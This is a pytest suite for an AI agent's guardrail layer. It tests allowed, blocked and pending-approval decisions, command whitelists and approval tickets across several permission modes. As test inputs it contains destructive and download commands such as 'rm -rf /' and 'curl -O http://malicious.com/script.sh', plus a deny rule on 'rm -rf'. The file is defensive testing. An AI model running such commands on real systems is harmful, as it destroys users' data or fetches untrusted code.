"""
Tests for unified Guardrail execution entry-point.

Covers:
- Three-state evaluation (allowed / blocked / pending_approval)
- check_and_execute returns ToolResult for allowed
- check_and_execute returns GuardrailResult for blocked
- check_and_execute creates ApprovalTicket for pending_approval
- PersonalGuardrails evaluation (whitelist, auto_approve_high, HIGH/CRITICAL)
- Legacy guarded_execute backward compatibility
- Legacy guarded_execute_with_confirmation backward compatibility
"""

from __future__ import annotations

import sys
import warnings
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from control_plane.approval import ApprovalRepository
from core.models import (
    GuardrailPolicy,
    PermissionMode,
    PersonalGuardrailPolicy,
    RiskLevel,
    ToolResult,
)
from guardrails.policy import GuardrailResult, Guardrails, PersonalGuardrails


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def mock_tool_registry():
    """Mock ToolRegistry that returns a success result on execute."""
    registry = MagicMock()
    registry.execute = MagicMock(
        return_value=ToolResult(
            tool_call_id="test-id", success=True, output="executed"
        )
    )
    return registry


@pytest.fixture
def default_policy():
    """Default GuardrailPolicy (DEFAULT mode)."""
    return GuardrailPolicy(
        mode=PermissionMode.DEFAULT,
        denied_tools=[],
        denied_commands=[],
        auto_approve_read=True,
    )


@pytest.fixture
def auto_policy():
    """AUTO mode GuardrailPolicy."""
    return GuardrailPolicy(
        mode=PermissionMode.AUTO,
        denied_tools=[],
        denied_commands=[],
        auto_approve_read=True,
    )


@pytest.fixture
def plan_policy():
    """PLAN mode GuardrailPolicy (read-only)."""
    return GuardrailPolicy(
        mode=PermissionMode.PLAN,
        denied_tools=[],
        denied_commands=[],
    )


@pytest.fixture
def dont_ask_policy():
    """DONT_ASK mode GuardrailPolicy."""
    return GuardrailPolicy(
        mode=PermissionMode.DONT_ASK,
        allowed_tools=["read", "glob"],
        denied_tools=["bash"],
    )


@pytest.fixture
def accept_edits_policy():
    """ACCEPT_EDITS mode GuardrailPolicy."""
    return GuardrailPolicy(
        mode=PermissionMode.ACCEPT_EDITS,
        denied_tools=[],
        denied_commands=[],
    )


@pytest.fixture
def default_guardrails(default_policy, mock_tool_registry):
    """Guardrails instance with DEFAULT mode."""
    return Guardrails(default_policy, mock_tool_registry)


@pytest.fixture
def auto_guardrails(auto_policy, mock_tool_registry):
    """Guardrails instance with AUTO mode."""
    return Guardrails(auto_policy, mock_tool_registry)


@pytest.fixture
def plan_guardrails(plan_policy, mock_tool_registry):
    """Guardrails instance with PLAN mode."""
    return Guardrails(plan_policy, mock_tool_registry)


@pytest.fixture
def dont_ask_guardrails(dont_ask_policy, mock_tool_registry):
    """Guardrails instance with DONT_ASK mode."""
    return Guardrails(dont_ask_policy, mock_tool_registry)


@pytest.fixture
def accept_edits_guardrails(accept_edits_policy, mock_tool_registry):
    """Guardrails instance with ACCEPT_EDITS mode."""
    return Guardrails(accept_edits_policy, mock_tool_registry)


@pytest.fixture
def personal_policy():
    """Default PersonalGuardrailPolicy with no whitelists."""
    return PersonalGuardrailPolicy(
        mode=PermissionMode.DONT_ASK,
        whitelist_patterns=[],
        whitelist_commands=[],
        auto_approve_high=False,
        confirmation_timeout_sec=300,
    )


@pytest.fixture
def personal_policy_with_whitelist():
    """PersonalGuardrailPolicy with whitelisted commands."""
    return PersonalGuardrailPolicy(
        mode=PermissionMode.DONT_ASK,
        whitelist_patterns=[
            r"^git\s+(status|log|diff)$",
            "pytest",
        ],
        whitelist_commands=["ls", "cat"],
        auto_approve_high=False,
        confirmation_timeout_sec=300,
    )


@pytest.fixture
def personal_guardrails(personal_policy, mock_tool_registry):
    """PersonalGuardrails instance with default policy."""
    return PersonalGuardrails(personal_policy, mock_tool_registry)


@pytest.fixture
def personal_guardrails_wl(personal_policy_with_whitelist, mock_tool_registry):
    """PersonalGuardrails instance with whitelist policy."""
    return PersonalGuardrails(personal_policy_with_whitelist, mock_tool_registry)


@pytest.fixture
def approval_repo(tmp_path):
    """ApprovalRepository backed by a temporary directory."""
    return ApprovalRepository(str(tmp_path / "approvals"))


# ---------------------------------------------------------------------------
# GuardrailResult data class
# ---------------------------------------------------------------------------


class TestGuardrailResult:
    """Unit tests for the GuardrailResult dataclass."""

    def test_allowed_state(self):
        r = GuardrailResult(decision="allowed", reason="Low risk")
        assert r.is_allowed is True
        assert r.is_blocked is False
        assert r.is_pending is False
        assert r.ticket_id is None

    def test_blocked_state(self):
        r = GuardrailResult(decision="blocked", reason="Denied")
        assert r.is_allowed is False
        assert r.is_blocked is True
        assert r.is_pending is False

    def test_pending_state(self):
        r = GuardrailResult(
            decision="pending_approval", reason="Needs approval", ticket_id="t_123"
        )
        assert r.is_allowed is False
        assert r.is_blocked is False
        assert r.is_pending is True
        assert r.ticket_id == "t_123"

    def test_repr_without_ticket(self):
        r = GuardrailResult(decision="allowed", reason="OK")
        assert "allowed" in repr(r)
        assert "OK" in repr(r)

    def test_repr_with_ticket(self):
        r = GuardrailResult(
            decision="pending_approval", reason="HIGH", ticket_id="t_abc"
        )
        assert "pending_approval" in repr(r)
        assert "t_abc" in repr(r)


# ---------------------------------------------------------------------------
# Three-state evaluation — Guardrails.evaluate()
# ---------------------------------------------------------------------------


class TestEvaluateThreeState_DEFAULT:
    """DEFAULT mode evaluation returns tri-state GuardrailResult."""

    def test_low_risk_returns_allowed(self, default_guardrails):
        result = default_guardrails.evaluate("read", {"file_path": "/tmp/test.txt"})
        assert isinstance(result, GuardrailResult)
        assert result.decision == "allowed"
        assert result.is_allowed is True

    def test_low_risk_glob_allowed(self, default_guardrails):
        result = default_guardrails.evaluate("glob", {"pattern": "*.py"})
        assert result.decision == "allowed"

    def test_medium_risk_returns_pending_approval(self, default_guardrails):
        result = default_guardrails.evaluate("write", {"file_path": "/tmp/a.txt", "content": "x"})
        assert isinstance(result, GuardrailResult)
        assert result.decision == "pending_approval"
        assert result.is_pending is True

    def test_high_risk_returns_pending_approval(self, default_guardrails):
        result = default_guardrails.evaluate("bash", {"command": "curl http://example.com"})
        assert isinstance(result, GuardrailResult)
        assert result.decision == "pending_approval"
        assert "HIGH" in result.reason

    def test_denied_tool_returns_blocked(self, default_guardrails):
        default_guardrails.policy.denied_tools = ["bash"]
        result = default_guardrails.evaluate("bash", {"command": "ls"})
        assert isinstance(result, GuardrailResult)
        assert result.decision == "blocked"
        assert result.is_blocked is True
        assert "denied" in result.reason.lower()

    def test_denied_command_returns_blocked(self, default_guardrails):
        default_guardrails.policy.denied_commands = ["rm -rf"]
        result = default_guardrails.evaluate("bash", {"command": "rm -rf /tmp"})
        assert result.decision == "blocked"
        assert "denied pattern" in result.reason

    def test_unknown_tool_defaults_to_high_pending(self, default_guardrails):
        """Tools not in RISK_MAP default to HIGH → pending_approval."""
        result = default_guardrails.evaluate("unknown_tool_xyz", {})
        assert result.decision == "pending_approval"


class TestEvaluateThreeState_AUTO:
    """AUTO mode evaluation."""

    def test_low_auto_approved(self, auto_guardrails):
        result = auto_guardrails.evaluate("read", {"file_path": "/tmp/test.txt"})
        assert result.decision == "allowed"

    def test_medium_auto_approved_when_flag_on(self, auto_guardrails):
        result = auto_guardrails.evaluate("write", {"file_path": "/tmp/a.txt", "content": "x"})
        assert result.decision == "allowed"

    def test_medium_pending_when_flag_off(self, mock_tool_registry):
        policy = GuardrailPolicy(
            mode=PermissionMode.AUTO, auto_approve_read=False
        )
        gr = Guardrails(policy, mock_tool_registry)
        result = gr.evaluate("write", {"file_path": "/tmp/a.txt", "content": "x"})
        assert result.decision == "pending_approval"

    def test_high_returns_pending_approval(self, auto_guardrails):
        result = auto_guardrails.evaluate("bash", {"command": "curl http://example.com"})
        assert result.decision == "pending_approval"
        assert "HIGH" in result.reason


class TestEvaluateThreeState_PLAN:
    """PLAN mode (read-only) evaluation."""

    def test_read_allowed(self, plan_guardrails):
        result = plan_guardrails.evaluate("read", {"file_path": "/tmp/test.txt"})
        assert result.decision == "allowed"

    def test_write_blocked(self, plan_guardrails):
        result = plan_guardrails.evaluate("write", {"file_path": "/tmp/a.txt", "content": "x"})
        assert result.decision == "blocked"
        assert "read-only" in result.reason.lower()

    def test_bash_blocked(self, plan_guardrails):
        result = plan_guardrails.evaluate("bash", {"command": "ls"})
        assert result.decision == "blocked"


class TestEvaluateThreeState_DONT_ASK:
    """DONT_ASK mode evaluation."""

    def test_allowed_tool(self, dont_ask_guardrails):
        result = dont_ask_guardrails.evaluate("read", {"file_path": "/tmp/test.txt"})
        assert result.decision == "allowed"
        assert "Pre-approved" in result.reason

    def test_not_allowed_tool_blocked(self, dont_ask_guardrails):
        result = dont_ask_guardrails.evaluate("edit", {"file_path": "/tmp/a.txt", "old_string": "a", "new_string": "b"})
        assert result.decision == "blocked"
        assert "not in allowed list" in result.reason

    def test_denied_tool_blocked_even_if_in_allowed(self, dont_ask_guardrails):
        """denied_tools takes precedence — bash is in denied_tools."""
        result = dont_ask_guardrails.evaluate("bash", {"command": "ls"})
        assert result.decision == "blocked"
        assert "denied" in result.reason.lower()


class TestEvaluateThreeState_ACCEPT_EDITS:
    """ACCEPT_EDITS mode evaluation."""

    def test_low_allowed(self, accept_edits_guardrails):
        result = accept_edits_guardrails.evaluate("read", {"file_path": "/tmp/test.txt"})
        assert result.decision == "allowed"

    def test_medium_allowed(self, accept_edits_guardrails):
        result = accept_edits_guardrails.evaluate("write", {"file_path": "/tmp/a.txt", "content": "x"})
        assert result.decision == "allowed"

    def test_high_pending(self, accept_edits_guardrails):
        result = accept_edits_guardrails.evaluate("bash", {"command": "curl http://example.com"})
        assert result.decision == "pending_approval"


# ---------------------------------------------------------------------------
# check_and_execute — unified entry-point
# ---------------------------------------------------------------------------


class TestCheckAndExecute_Allowed:
    """check_and_execute returns ToolResult when decision is allowed."""

    def test_allowed_returns_tool_result(self, default_guardrails, mock_tool_registry):
        result = default_guardrails.check_and_execute(
            "read", {"file_path": "/tmp/test.txt"}, job_id="job_1"
        )
        assert isinstance(result, ToolResult)
        assert result.success is True
        assert result.output == "executed"
        mock_tool_registry.execute.assert_called_once_with(
            "read", {"file_path": "/tmp/test.txt"}
        )

    def test_auto_mode_allowed(self, auto_guardrails, mock_tool_registry):
        result = auto_guardrails.check_and_execute(
            "read", {"file_path": "/tmp/test.txt"}
        )
        assert isinstance(result, ToolResult)
        assert result.success is True


class TestCheckAndExecute_Blocked:
    """check_and_execute returns GuardrailResult when decision is blocked."""

    def test_blocked_returns_guardrail_result(self, dont_ask_guardrails):
        result = dont_ask_guardrails.check_and_execute(
            "edit", {"file_path": "/tmp/a.txt", "old_string": "a", "new_string": "b"}
        )
        assert isinstance(result, GuardrailResult)
        assert result.decision == "blocked"
        assert result.is_blocked is True

    def test_blocked_no_tool_execution(self, dont_ask_guardrails, mock_tool_registry):
        dont_ask_guardrails.check_and_execute(  # noqa: F841
            "edit", {"file_path": "/tmp/a.txt", "old_string": "a", "new_string": "b"}
        )
        mock_tool_registry.execute.assert_not_called()

    def test_deny_list_blocked(self, default_guardrails, mock_tool_registry):
        default_guardrails.policy.denied_tools = ["bash"]
        result = default_guardrails.check_and_execute("bash", {"command": "ls"})
        assert isinstance(result, GuardrailResult)
        assert result.decision == "blocked"
        mock_tool_registry.execute.assert_not_called()


class TestCheckAndExecute_PendingApproval:
    """check_and_handle returns GuardrailResult with ticket when pending."""

    def test_pending_returns_guardrail_result(self, default_guardrails):
        result = default_guardrails.check_and_execute(
            "bash", {"command": "curl http://example.com"}
        )
        assert isinstance(result, GuardrailResult)
        assert result.decision == "pending_approval"
        assert result.is_pending is True
        assert result.ticket_id is None  # no approval_repo provided

    def test_pending_creates_ticket_when_repo_provided(
        self, default_guardrails, approval_repo
    ):
        result = default_guardrails.check_and_execute(
            "bash",
            {"command": "curl http://example.com"},
            job_id="job_123",
            run_id="run_456",
            approval_repo=approval_repo,
        )
        assert isinstance(result, GuardrailResult)
        assert result.decision == "pending_approval"
        assert result.ticket_id is not None
        assert result.ticket_id.startswith("ticket_")
        assert "ticket:" in result.reason

        # Verify the ticket was actually persisted
        ticket = approval_repo.get_ticket(result.ticket_id)
        assert ticket is not None
        assert ticket.tool_name == "bash"
        assert ticket.status.value == "pending"
        assert ticket.job_id == "job_123"
        assert ticket.run_id == "run_456"

    def test_pending_no_ticket_without_job_id(self, default_guardrails, approval_repo):
        """If job_id is empty, ticket should NOT be created."""
        result = default_guardrails.check_and_execute(
            "bash",
            {"command": "curl http://example.com"},
            job_id="",
            approval_repo=approval_repo,
        )
        assert isinstance(result, GuardrailResult)
        assert result.decision == "pending_approval"
        assert result.ticket_id is None

    def test_pending_no_ticket_without_repo(self, default_guardrails):
        """If approval_repo is None, ticket should NOT be created."""
        result = default_guardrails.check_and_execute(
            "bash",
            {"command": "curl http://example.com"},
            job_id="job_123",
            approval_repo=None,
        )
        assert isinstance(result, GuardrailResult)
        assert result.decision == "pending_approval"
        assert result.ticket_id is None

    def test_medium_risk_creates_ticket(self, default_guardrails, approval_repo):
        """MEDIUM risk in DEFAULT mode → pending_approval with ticket."""
        result = default_guardrails.check_and_execute(
            "write",
            {"file_path": "/tmp/a.txt", "content": "x"},
            job_id="job_123",
            approval_repo=approval_repo,
        )
        assert isinstance(result, GuardrailResult)
        assert result.decision == "pending_approval"
        assert result.ticket_id is not None


# ---------------------------------------------------------------------------
# PersonalGuardrails — tri-state evaluation
# ---------------------------------------------------------------------------


class TestPersonalEvaluate_LowMedium:
    """PersonalGuardrails: LOW and MEDIUM risk → allowed."""

    def test_low_read(self, personal_guardrails):
        result = personal_guardrails.evaluate("read", {"file_path": "/tmp/test.txt"})
        assert isinstance(result, GuardrailResult)
        assert result.decision == "allowed"
        assert "low risk" in result.reason.lower()

    def test_low_glob(self, personal_guardrails):
        result = personal_guardrails.evaluate("glob", {"pattern": "*.py"})
        assert result.decision == "allowed"

    def test_medium_write(self, personal_guardrails):
        result = personal_guardrails.evaluate(
            "write", {"file_path": "/tmp/a.txt", "content": "x"}
        )
        assert result.decision == "allowed"
        assert "medium risk" in result.reason.lower()

    def test_medium_git(self, personal_guardrails):
        result = personal_guardrails.evaluate("git", {"command": "status"})
        assert result.decision == "allowed"


class TestPersonalEvaluate_High:
    """PersonalGuardrails: HIGH risk → whitelist check or pending_approval."""

    def test_high_bash_pending(self, personal_guardrails):
        result = personal_guardrails.evaluate("bash", {"command": "rm -rf /tmp"})
        assert isinstance(result, GuardrailResult)
        assert result.decision == "pending_approval"
        assert "HIGH" in result.reason

    def test_high_auto_approve_high_flag(self, mock_tool_registry):
        policy = PersonalGuardrailPolicy(
            mode=PermissionMode.DONT_ASK,
            auto_approve_high=True,
        )
        gr = PersonalGuardrails(policy, mock_tool_registry)
        result = gr.evaluate("bash", {"command": "curl https://example.com"})
        assert result.decision == "allowed"
        assert "auto_approve_high" in result.reason.lower()

    def test_unknown_tool_defaults_to_high(self, personal_guardrails):
        """Tools not in RISK_MAP default to HIGH → pending_approval."""
        result = personal_guardrails.evaluate("unknown_tool", {})
        assert result.decision == "pending_approval"
        assert "HIGH" in result.reason


class TestPersonalEvaluate_Whitelist:
    """PersonalGuardrails: whitelist hit → allowed."""

    def test_regex_git_status(self, personal_guardrails_wl):
        result = personal_guardrails_wl.evaluate("bash", {"command": "git status"})
        assert result.decision == "allowed"
        assert "whitelist" in result.reason.lower()

    def test_regex_git_log(self, personal_guardrails_wl):
        result = personal_guardrails_wl.evaluate("bash", {"command": "git log"})
        assert result.decision == "allowed"

    def test_regex_git_diff(self, personal_guardrails_wl):
        result = personal_guardrails_wl.evaluate("bash", {"command": "git diff"})
        assert result.decision == "allowed"

    def test_prefix_pytest(self, personal_guardrails_wl):
        result = personal_guardrails_wl.evaluate("bash", {"command": "pytest -xvs tests/"})
        assert result.decision == "allowed"
        assert "whitelist" in result.reason.lower()

    def test_command_ls(self, personal_guardrails_wl):
        result = personal_guardrails_wl.evaluate("bash", {"command": "ls -la /tmp"})
        assert result.decision == "allowed"

    def test_command_cat(self, personal_guardrails_wl):
        result = personal_guardrails_wl.evaluate("bash", {"command": "cat /tmp/file.txt"})
        assert result.decision == "allowed"

    def test_non_whitelisted_high_pending(self, personal_guardrails_wl):
        """HIGH-risk command NOT in whitelist → pending_approval."""
        result = personal_guardrails_wl.evaluate(
            "bash", {"command": "curl -O http://malicious.com/script.sh"}
        )
        assert result.decision == "pending_approval"
        assert "HIGH" in result.reason

    def test_whitelist_only_for_bash(self, personal_guardrails_wl):
        """Non-bash tools get risk-level evaluation, not command-level whitelist."""
        result = personal_guardrails_wl.evaluate(
            "write", {"file_path": "/tmp/a.txt", "content": "x"}
        )
        assert result.decision == "allowed"
        assert "medium" in result.reason.lower()


class TestPersonalEvaluate_Critical:
    """PersonalGuardrails: CRITICAL → always pending_approval."""

    def test_critical_always_pending(self, personal_guardrails):
        with patch.object(
            personal_guardrails, "RISK_MAP", {**personal_guardrails.RISK_MAP, "destroy": RiskLevel.CRITICAL}
        ):
            result = personal_guardrails.evaluate("destroy", {"target": "database"})
        assert result.decision == "pending_approval"
        assert "CRITICAL" in result.reason

    def test_critical_even_with_auto_approve_high(self, mock_tool_registry):
        policy = PersonalGuardrailPolicy(
            mode=PermissionMode.DONT_ASK,
            auto_approve_high=True,
        )
        gr = PersonalGuardrails(policy, mock_tool_registry)
        with patch.object(
            gr, "RISK_MAP", {**gr.RISK_MAP, "destroy": RiskLevel.CRITICAL}
        ):
            result = gr.evaluate("destroy", {"target": "database"})
        assert result.decision == "pending_approval"
        assert "CRITICAL" in result.reason


# ---------------------------------------------------------------------------
# PersonalGuardrails — check_and_execute integration
# ---------------------------------------------------------------------------


class TestPersonalCheckAndExecute:
    """PersonalGuardrails.check_and_execute follows the unified path."""

    def test_allowed_returns_tool_result(self, personal_guardrails, mock_tool_registry):
        result = personal_guardrails.check_and_execute(
            "read", {"file_path": "/tmp/test.txt"}
        )
        assert isinstance(result, ToolResult)
        assert result.success is True

    def test_whitelisted_bash_returns_tool_result(self, personal_guardrails_wl, mock_tool_registry):
        result = personal_guardrails_wl.check_and_execute(
            "bash", {"command": "git status"}
        )
        assert isinstance(result, ToolResult)
        assert result.success is True

    def test_high_risk_pending(self, personal_guardrails):
        result = personal_guardrails.check_and_execute(
            "bash", {"command": "curl http://example.com"}
        )
        assert isinstance(result, GuardrailResult)
        assert result.decision == "pending_approval"

    def test_high_risk_creates_ticket(self, personal_guardrails, approval_repo):
        result = personal_guardrails.check_and_execute(
            "bash",
            {"command": "curl http://example.com"},
            job_id="job_123",
            approval_repo=approval_repo,
        )
        assert isinstance(result, GuardrailResult)
        assert result.ticket_id is not None
        assert result.ticket_id.startswith("ticket_")


# ---------------------------------------------------------------------------
# Legacy backward compatibility — guarded_execute
# ---------------------------------------------------------------------------


class TestLegacyGuardedExecute:
    """guarded_execute() still works but emits a DeprecationWarning."""

    def test_deprecated_warning(self, default_guardrails):
        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")
            default_guardrails.guarded_execute("read", {"file_path": "/tmp/test.txt"})
            assert len(w) == 1
            assert issubclass(w[0].category, DeprecationWarning)
            assert "check_and_execute" in str(w[0].message)

    def test_allowed_returns_tool_result(self, default_guardrails, mock_tool_registry):
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            result = default_guardrails.guarded_execute(
                "read", {"file_path": "/tmp/test.txt"}
            )
        assert isinstance(result, ToolResult)
        assert result.success is True
        mock_tool_registry.execute.assert_called_once()

    def test_blocked_returns_error_tool_result(self, default_guardrails, mock_tool_registry):
        default_guardrails.policy.denied_tools = ["bash"]
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            result = default_guardrails.guarded_execute("bash", {"command": "ls"})
        assert isinstance(result, ToolResult)
        assert result.success is False
        assert "Blocked by guardrails:" in result.error
        mock_tool_registry.execute.assert_not_called()

    def test_pending_approval_returns_error_tool_result(self, default_guardrails, mock_tool_registry):
        """guarded_execute maps pending_approval to an error ToolResult (legacy)."""
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            result = default_guardrails.guarded_execute(
                "bash", {"command": "curl http://example.com"}
            )
        assert isinstance(result, ToolResult)
        assert result.success is False
        assert "Blocked by guardrails:" in result.error
        mock_tool_registry.execute.assert_not_called()


# ---------------------------------------------------------------------------
# Legacy backward compatibility — guarded_execute_with_confirmation
# ---------------------------------------------------------------------------


class TestLegacyGuardedExecuteWithConfirmation:
    """guarded_execute_with_confirmation() still works with deprecation warning."""

    def test_deprecated_warning(self, personal_guardrails):
        with patch.object(personal_guardrails, "request_confirmation", return_value=True):
            with warnings.catch_warnings(record=True) as w:
                warnings.simplefilter("always")
                personal_guardrails.guarded_execute_with_confirmation(
                    "bash", {"command": "echo hello"}
                )
                assert len(w) == 1
                assert issubclass(w[0].category, DeprecationWarning)
                assert "check_and_execute" in str(w[0].message)

    def test_auto_approved_no_confirmation(self, personal_guardrails, mock_tool_registry):
        """LOW risk should execute without requesting confirmation."""
        with patch.object(personal_guardrails, "request_confirmation") as mock_confirm:
            with warnings.catch_warnings():
                warnings.simplefilter("ignore")
                result = personal_guardrails.guarded_execute_with_confirmation(
                    "read", {"file_path": "/tmp/test.txt"}
                )
        mock_confirm.assert_not_called()
        assert result.success is True

    def test_confirmed_executes(self, personal_guardrails, mock_tool_registry):
        """When user confirms, the tool executes."""
        with patch.object(personal_guardrails, "request_confirmation", return_value=True):
            with warnings.catch_warnings():
                warnings.simplefilter("ignore")
                result = personal_guardrails.guarded_execute_with_confirmation(
                    "bash", {"command": "echo hello"}
                )
        assert isinstance(result, ToolResult)
        assert result.success is True
        assert result.output == "executed"

    def test_denied_returns_error(self, personal_guardrails):
        """When user denies, return error ToolResult."""
        with patch.object(personal_guardrails, "request_confirmation", return_value=False):
            with warnings.catch_warnings():
                warnings.simplefilter("ignore")
                result = personal_guardrails.guarded_execute_with_confirmation(
                    "bash", {"command": "rm -rf /"}
                )
        assert isinstance(result, ToolResult)
        assert result.success is False
        assert result.error != ""


# ---------------------------------------------------------------------------
# _is_whitelisted helper
# ---------------------------------------------------------------------------


class TestIsWhitelisted:
    """Direct tests for _is_whitelisted."""

    def test_prefix_match(self, personal_guardrails_wl):
        assert personal_guardrails_wl._is_whitelisted("pytest -x") is True

    def test_prefix_ls(self, personal_guardrails_wl):
        assert personal_guardrails_wl._is_whitelisted("ls -la") is True

    def test_regex_git_status(self, personal_guardrails_wl):
        assert personal_guardrails_wl._is_whitelisted("git status") is True

    def test_regex_git_push_no_match(self, personal_guardrails_wl):
        assert personal_guardrails_wl._is_whitelisted("git push origin main") is False

    def test_no_match(self, personal_guardrails_wl):
        assert personal_guardrails_wl._is_whitelisted("rm -rf /") is False

    def test_invalid_regex_falls_back(self, mock_tool_registry):
        policy = PersonalGuardrailPolicy(
            mode=PermissionMode.DONT_ASK,
            whitelist_patterns=["[invalid(regex"],
        )
        gr = PersonalGuardrails(policy, mock_tool_registry)
        assert gr._is_whitelisted("[invalid(regex here") is True


# ---------------------------------------------------------------------------
# Policy inheritance
# ---------------------------------------------------------------------------


class TestPolicyInheritance:
    """PersonalGuardrailPolicy is a subclass of GuardrailPolicy."""

    def test_isinstance(self, personal_policy):
        assert isinstance(personal_policy, GuardrailPolicy)
        assert isinstance(personal_policy, PersonalGuardrailPolicy)

    def test_base_fields(self, personal_policy):
        assert hasattr(personal_policy, "mode")
        assert hasattr(personal_policy, "allowed_tools")
        assert hasattr(personal_policy, "denied_tools")
        assert hasattr(personal_policy, "max_iterations")

    def test_personal_fields(self, personal_policy):
        assert hasattr(personal_policy, "whitelist_patterns")
        assert hasattr(personal_policy, "whitelist_commands")
        assert hasattr(personal_policy, "auto_approve_high")
        assert hasattr(personal_policy, "confirmation_timeout_sec")


# ---------------------------------------------------------------------------
# Integration: PersonalGuardrails + approval ticket creation
# ---------------------------------------------------------------------------


class TestPersonalTicketCreation:
    """PersonalGuardrails creates tickets through the unified entry-point."""

    def test_high_risk_creates_ticket(self, personal_guardrails, approval_repo):
        result = personal_guardrails.check_and_execute(
            "bash",
            {"command": "curl http://example.com"},
            job_id="job_789",
            approval_repo=approval_repo,
        )
        assert isinstance(result, GuardrailResult)
        assert result.ticket_id is not None
        ticket = approval_repo.get_ticket(result.ticket_id)
        assert ticket is not None
        assert ticket.risk_level == "high"

    def test_whitelisted_no_ticket(self, personal_guardrails_wl, approval_repo, mock_tool_registry):
        """Whitelisted commands execute directly — no ticket created."""
        result = personal_guardrails_wl.check_and_execute(
            "bash",
            {"command": "git status"},
            job_id="job_789",
            approval_repo=approval_repo,
        )
        assert isinstance(result, ToolResult)
        assert result.success is True
        # No tickets should be created
        assert len(approval_repo.list_tickets()) == 0


# ---------------------------------------------------------------------------
# CRITICAL risk in base Guardrails
# ---------------------------------------------------------------------------


class TestCriticalRisk:
    """CRITICAL risk operations in base Guardrails."""

    def test_default_mode_critical_pending(self, default_guardrails):
        with patch.object(
            default_guardrails,
            "RISK_MAP",
            {**default_guardrails.RISK_MAP, "destroy": RiskLevel.CRITICAL},
        ):
            result = default_guardrails.evaluate("destroy", {"target": "prod"})
        assert result.decision == "pending_approval"
        assert "CRITICAL" in result.reason

    def test_auto_mode_critical_pending(self, auto_guardrails):
        with patch.object(
            auto_guardrails,
            "RISK_MAP",
            {**auto_guardrails.RISK_MAP, "destroy": RiskLevel.CRITICAL},
        ):
            result = auto_guardrails.check_and_execute(
                "destroy",
                {"target": "prod"},
                job_id="job_c",
                approval_repo=None,
            )
        assert isinstance(result, GuardrailResult)
        assert result.decision == "pending_approval"
        assert "CRITICAL" in result.reason

    def test_plan_mode_critical_blocked(self, plan_guardrails):
        with patch.object(
            plan_guardrails,
            "RISK_MAP",
            {**plan_guardrails.RISK_MAP, "destroy": RiskLevel.CRITICAL},
        ):
            result = plan_guardrails.evaluate("destroy", {"target": "prod"})
        assert result.decision == "blocked"
